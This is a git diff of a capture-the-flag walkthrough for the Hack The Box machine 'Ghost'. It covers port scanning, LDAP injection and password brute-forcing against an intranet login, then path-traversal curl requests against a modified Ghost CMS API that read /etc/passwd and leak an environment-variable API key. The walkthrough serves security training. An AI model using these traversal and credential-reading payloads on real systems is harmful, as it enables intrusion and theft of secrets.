@@ -120,9 +120,9 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 111.82 seconds
 ```
 
-### 1.2. Exploring
+## 2. Exploring
 
-#### 1.2.1. `443`
+### 2.1. `443`
 
 `443` appears to be exposed, but not accessible
 
@@ -145,7 +145,7 @@ root@kali:~# curl -v https://ghost.htb
 curl: (35) Recv failure: Connection reset by peer
 ```
 
-#### 1.2.2. `8443`
+### 2.2. `8443`
 
 `https://core.ghost.htb:8443/login`:
 
@@ -155,7 +155,7 @@ curl: (35) Recv failure: Connection reset by peer
 
 ![image](https://github.com/user-attachments/assets/12742a21-67fe-4694-a40b-b5a4fa13ed94)
 
-#### 1.2.3. `8008`
+### 2.3. `8008`
 
 Root page appears to be some kind of blog:
 
@@ -171,9 +171,9 @@ Viewing the page source reveals some kind of id:
 
 ![image](https://github.com/user-attachments/assets/6dd4c0b5-a6ae-4a30-ac13-d99c9b151b1e)
 
-### 1.3. Web enumeration
+## 3. Web enumeration
 
-#### 1.3.1. Enumerate for pages
+### 3.1. Enumerate for pages
 
 ```console
 root@kali:~# gobuster dir -u http://ghost.htb:8008 -w /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -229,7 +229,7 @@ Finished
 |`-f`|Append `/` to each request|
 |`-t`|Number of concurrent threads (default 10)|
 
-#### 1.3.2. Enumerate for domains
+### 3.2. Enumerate for domains
 
 The root page is already seen, let's get the response size for the root page so that it can be filtered away from the fuzzing result
 
@@ -277,7 +277,7 @@ intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration:
 :: Progress: [151265/151265] :: Job [1/1] :: 18 req/sec :: Duration: [1:23:25] :: Errors: 47 ::
 ```
 
-### 1.4. Gitea
+#### 3.2.1. Gitea
 
 Nothing much here:
 
@@ -289,11 +289,13 @@ Nothing much here:
 
 ![image](https://github.com/user-attachments/assets/5947dd59-d54d-4303-95c1-49edb124de4a)
 
-### 1.5. Intranet
+#### 3.2.2. Intranet
 
 ![image](https://github.com/user-attachments/assets/79f3c49d-ce45-4d07-9361-0b3521e5699f)
 
-Attempt to login:
+## 4. Initial access
+
+### 4.1. Attempt login to intranet
 
 ![image](https://github.com/user-attachments/assets/d4b6b330-8298-4d70-aa15-327545ca7235)
 
@@ -317,9 +319,11 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection
 
 ![image](https://github.com/user-attachments/assets/3db318f7-e0b2-40f1-814a-65b47ab1bf52)
 
-### 1.6. Guessing password for `gitea_temp_principal`
+Based on the post on `Git Migration`, the `gitea_temp_principal` appears to be quite important, this may be a way in
 
-#### 1.6.1. Optiion 1: Burp Suite
+### 4.2.. Guessing password for `gitea_temp_principal`
+
+#### 4.2.1. Option 1: Burp Suite
 
 ![image](https://github.com/user-attachments/assets/1092392d-13e4-4996-b159-3945e017720c)
 
@@ -335,7 +339,15 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection
 
 ![image](https://github.com/user-attachments/assets/a2c5561d-face-4dad-a9c4-fe32ee644faa)
 
-#### 1.6.2. Option 2: Python script
+#### 4.2.2. Option 2: Python script
+
+> [!Tip]
+>
+> Brute force using Burp Suite is nearly impossible because of the free edition rate throttle
+>
+> Using the Python script method would make more sense
+>
+> The script took only 9 seconds to complete
 
 ```py
 import string
@@ -396,3 +408,113 @@ Passwd: szrr8kpc3z6onlq
 Passwd: szrr8kpc3z6onlqf
 szrr8kpc3z6onlqf
 ```
+
+## 5. Exploring Gitea with discovered credentials
+
+Sign in to Gitea with `gitea_temp_principal`:`szrr8kpc3z6onlqf`:
+
+![image](https://github.com/user-attachments/assets/85ac0ad4-2543-4c93-b1e4-0a22b2a2a321)
+
+The `README` for `blog` repository reveals important clues
+
+![image](https://github.com/user-attachments/assets/df3e7953-a711-4f53-8b1e-a5a38a17cfb3)
+
+- The blog uses Ghost CMS, which is running in a Docker container
+- The blog integrates with intranet via an API key named `DEV_INTRANET_KEY`, stored as an environment variable
+- The public API key for Ghost is: `a5af628828958c976a3b6cc81a`
+- The `posts-public.js` for Ghost CMS is modified
+
+### 5.1. Exploiting LFI for the modified Ghost CMS file
+
+Analyzing `posts-public.js` reveals a possibility for LFI via the query parameter `extra`:
+
+```js
+        async query(frame) {
+            const options = {
+                ...frame.options,
+                mongoTransformer: rejectPrivateFieldsTransformer
+            };
+            const posts = await postsService.browsePosts(options);
+            const extra = frame.original.query?.extra;
+            if (extra) {
+                const fs = require("fs");
+                if (fs.existsSync(extra)) {
+                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
+                    posts.meta.extra = { [extra]: fileContent };
+                }
+            }
+            return posts;
+        }
+```
+
+The path for `fs.readFileSync` function is not sanitized, which means it may be possible for LFI using travesal `../` method
+
+Googling for Ghost API key documentation (https://ghost.org/docs/content-api/):
+- API URL is at: `https://{admin_domain}/ghost/api/content/`
+- Content API keys are provided via a query parameter in the URL `?key={key}`
+
+Attempt to read `/etc/passwd` with the Ghost API:
+
+```
+curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a" | jq
+```
+
+The file data is in `"extra"`:
+
+```json
+{
+  "posts": [
+    {
+      "id": "65bdd2dc26db7d00010704b5",
+      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
+      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
+      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
+      ⋮
+        <truncated>
+      ⋮
+    }
+  ],
+  "meta": {
+    "extra": {
+      "../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
+    }
+  }
+}
+```
+
+> [!Note]
+>
+> `/etc/passwd` exists even though the target is a Windows machine suggests that Ghost CMS is running in a Linux container
+
+Recall that the blog integrates with intranet via an API key named `DEV_INTRANET_KEY`, stored as an environment variable
+
+Let's attempt to retrieve the container environment variables:
+
+```
+curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
+```
+
+```json
+{
+  "posts": [
+    {
+      "id": "65bdd2dc26db7d00010704b5",
+      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
+      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
+      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
+      ⋮
+        <truncated>
+      ⋮
+    }
+  ],
+  "meta": {
+    "extra": {
+      "../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
+    }
+  }
+}
+```
+
+`DEV_INTRANET_KEY` = `!@yqr!X2kxmQ.@Xe`
+
+## 6. Going back to intranet with the discovered API key
